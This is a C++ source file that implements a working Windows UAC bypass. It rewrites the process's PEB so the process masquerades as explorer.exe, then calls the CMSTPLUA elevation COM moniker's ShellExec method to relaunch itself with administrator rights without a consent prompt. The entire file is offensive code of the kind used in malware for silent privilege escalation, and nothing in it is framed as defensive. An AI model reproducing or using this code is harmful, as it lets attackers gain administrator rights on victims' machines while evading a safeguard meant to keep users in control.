#include "uacbypass.h"
#include "log.h"
#include <winternl.h>
#include <objbase.h>
#include <objidl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")

typedef struct _MY_PEB_LDR_DATA {
    ULONG     Length;
    BOOLEAN   Initialized;
    HANDLE    SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID     EntryInProgress;
    BOOLEAN   ShutdownInProgress;
    HANDLE    ShutdownThreadId;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} MY_PEB, *PMY_PEB;

class __declspec(uuid("6EDD6D74-C007-4E75-B76A-E5740995E24C")) ICMLuaUtil : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
    virtual HRESULT STDMETHODCALLTYPE ShellExec(LPCWSTR lpFile, LPCWSTR lpParameters,
                                                 LPCWSTR lpDirectory, ULONG fMask, ULONG nShow) = 0;
};

static bool MasqueradePEB(LPCWSTR targetPath) {
#ifdef _WIN64
    PMY_PEB pPEB = (PMY_PEB)__readgsqword(0x60);
#else
    PMY_PEB pPEB = (PMY_PEB)__readfsdword(0x30);
#endif
    if (!pPEB || !pPEB->ProcessParameters || !pPEB->Ldr) return false;

    size_t pathLen = (wcslen(targetPath) + 1) * sizeof(WCHAR);
    PWSTR newPath = (PWSTR)LocalAlloc(LPTR, pathLen);
    if (!newPath) return false;
    wcscpy_s(newPath, pathLen / sizeof(WCHAR), targetPath);

    UNICODE_STRING usPath;
    RtlInitUnicodeString(&usPath, newPath);

    pPEB->ProcessParameters->ImagePathName = usPath;
    pPEB->ProcessParameters->CommandLine = usPath;

    PLIST_ENTRY pHead = &pPEB->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY pCurrent = pHead->Flink;
    PMY_LDR_DATA_TABLE_ENTRY pLdrEntry = (PMY_LDR_DATA_TABLE_ENTRY)pCurrent;
    pLdrEntry->FullDllName = usPath;

    PCWSTR fileName = wcsrchr(targetPath, L'\\');
    if (fileName) {
        fileName++;
        UNICODE_STRING usBaseName;
        RtlInitUnicodeString(&usBaseName, fileName);
        pLdrEntry->BaseDllName = usBaseName;
    }

    return true;
}

static bool UACBypassRun(LPCWSTR exePath) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        LOG_ERR("UACBypass: CoInitialize failed 0x%08X", hr);
        return false;
    }

    LPCWSTR moniker = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    BIND_OPTS3 bop = {};
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = CLSCTX_LOCAL_SERVER;

    ICMLuaUtil* pUtil = nullptr;
    hr = CoGetObject(moniker, (BIND_OPTS*)&bop, __uuidof(ICMLuaUtil), (void**)&pUtil);

    if (FAILED(hr)) {
        LOG_ERR("UACBypass: CoGetObject failed 0x%08X", hr);
        CoUninitialize();
        return false;
    }

    LOG_INFO("UACBypass: COM elevation success, launching...");
    hr = pUtil->ShellExec(exePath, NULL, NULL, 0, SW_SHOW);
    pUtil->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}

bool UACBypassSelf() {
    TOKEN_ELEVATION elevation = {};
    DWORD size = 0;
    HANDLE hToken = NULL;
    bool alreadyElevated = false;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size))
            alreadyElevated = (elevation.TokenIsElevated != 0);
        CloseHandle(hToken);
    }
    
    if (alreadyElevated) {
        LOG_INFO("UACBypass: already elevated, skipping");
        return true;
    }
    
    // 在伪装peb之前获取，不然拿到的就是explorer.exe
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    
    LOG_INFO("UACBypass: masquerading PEB as explorer.exe...");
    if (!MasqueradePEB(L"C:\\Windows\\explorer.exe")) {
        LOG_ERR("UACBypass: PEB masquerade failed");
        return false;
    }

    LOG_OK("UACBypass: SelfPath: %ls",selfPath);
    if (!UACBypassRun(selfPath)) {
        LOG_ERR("UACBypass: elevation failed");
        return false;
    }

    LOG_OK("UACBypass: launched elevated instance, exiting current process");
    ExitProcess(0);
    return true;
}
